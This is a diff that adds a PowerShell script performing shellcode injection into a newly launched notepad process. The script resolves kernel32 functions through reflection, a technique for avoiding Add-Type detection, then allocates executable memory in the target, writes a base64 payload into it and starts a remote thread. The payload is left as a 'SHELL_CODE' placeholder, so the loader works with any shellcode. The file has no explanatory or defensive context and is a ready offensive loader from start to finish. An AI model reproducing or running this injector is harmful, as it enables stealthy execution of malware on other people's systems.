@@ -1,0 +1,65 @@
+function LookupFunc 
+{
+    Param ($moduleName, $functionName)
+
+    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp=@()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+}
+
+function getDelegateType 
+{
+  Param (
+    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+    [Parameter(Position = 1)] [Type] $delType = [Void]
+  )
+
+  $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+
+  $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
+
+   $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
+
+  return $type.CreateType()
+}
+
+
+[Byte[]]$shellcode = [System.Convert]::FromBase64String("SHELL_CODE")
+
+
+# Start notepad
+$proc = Start-Process notepad -PassThru
+Start-Sleep -Milliseconds 500
+
+# OpenProcess
+$OpenProcessAddr = LookupFunc kernel32.dll OpenProcess
+$OpenProcessType = getDelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
+$OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessType)
+$hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $proc.Id)
+
+# VirtualAllocEx
+$VirtualAllocExAddr = LookupFunc kernel32.dll VirtualAllocEx
+$VirtualAllocExType = getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
+$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExType)
+$allocAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)
+
+# WriteProcessMemory
+$WriteProcessMemoryAddr = LookupFunc kernel32.dll WriteProcessMemory
+$WriteProcessMemoryType = getDelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
+$WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryType)
+$bytesWritten = [IntPtr]::Zero
+$WriteProcessMemory.Invoke($hProcess, $allocAddr, $shellcode, $shellcode.Length, [ref]$bytesWritten)
+
+# CreateRemoteThreadEx
+$CreateRemoteThreadExAddr = LookupFunc kernel32.dll CreateRemoteThreadEx
+$CreateRemoteThreadExType = getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr].MakeByRefType()) ([IntPtr])
+$CreateRemoteThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadExAddr, $CreateRemoteThreadExType)
+$threadId = [IntPtr]::Zero
+$hThread = $CreateRemoteThreadEx.Invoke($hProcess, [IntPtr]::Zero, 0, $allocAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero, [ref]$threadId)
+
+# WaitForSingleObject
+$WaitForSingleObjectAddr = LookupFunc kernel32.dll WaitForSingleObject
+$WaitForSingleObjectType = getDelegateType @([IntPtr], [Int32]) ([UInt32])
+$WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectType)
+$WaitForSingleObject.Invoke($hThread, 0xFFFFFFFF)
